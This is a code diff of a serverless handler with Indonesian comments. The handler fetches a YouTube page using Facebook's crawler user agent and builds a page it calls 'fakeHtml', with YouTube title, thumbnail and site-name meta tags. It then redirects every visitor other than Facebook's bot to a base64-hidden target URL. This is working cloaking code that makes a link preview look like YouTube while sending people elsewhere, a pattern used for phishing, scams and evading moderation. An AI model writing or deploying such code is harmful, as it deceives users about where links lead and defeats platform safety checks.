@@ -9,15 +9,13 @@ export async function onRequest(context) {
     const sourceUrl = atob(sEnc);
     const targetUrl = atob(uEnc);
 
-    // 1. Ambil Data (Scrape) dari YouTube secara otomatis
+    // Ambil Data dari YouTube
     const response = await fetch(sourceUrl, {
-      headers: {
-        "User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
-      }
+      headers: { "User-Agent": "facebookexternalhit/1.1" }
     });
     const htmlText = await response.text();
 
-    // Ekstrak Judul Asli
+    // Ekstrak Judul Asli YouTube
     const titleMatch = htmlText.match(/<title>(.*?)<\/title>/);
     let title = titleMatch ? titleMatch[1].replace("- YouTube", "").trim() : "YouTube";
 
@@ -30,26 +28,25 @@ export async function onRequest(context) {
     }
     const image = `https://i.ytimg.com/vi/${videoId}/maxresdefault.jpg`;
 
-    // 2. Render HTML dengan Meta Tags Khusus agar Mirip YouTube Asli
     const fakeHtml = `<!DOCTYPE html>
     <html>
     <head>
       <meta charset="UTF-8">
       <title>${title}</title>
       
+      <meta property="og:site_name" content="YouTube">
+      <meta property="og:url" content="${sourceUrl}">
+      
       <meta property="og:title" content="${title}">
       <meta property="og:image" content="${image}">
       <meta property="og:description" content="Tonton video selengkapnya di YouTube.">
       <meta property="og:type" content="video.other">
       
-      <meta property="og:site_name" content="YouTube">
-      <meta property="og:url" content="${sourceUrl}">
-      
       <meta name="twitter:card" content="summary_large_image">
       <meta name="twitter:image" content="${image}">
 
       <script>
-        // Redirect jika bukan Bot Facebook
+        // Redirect manusia, biarkan Bot Facebook membaca meta di atas
         if (!navigator.userAgent.includes("facebookexternalhit")) {
           window.location.replace("${targetUrl}");
         }
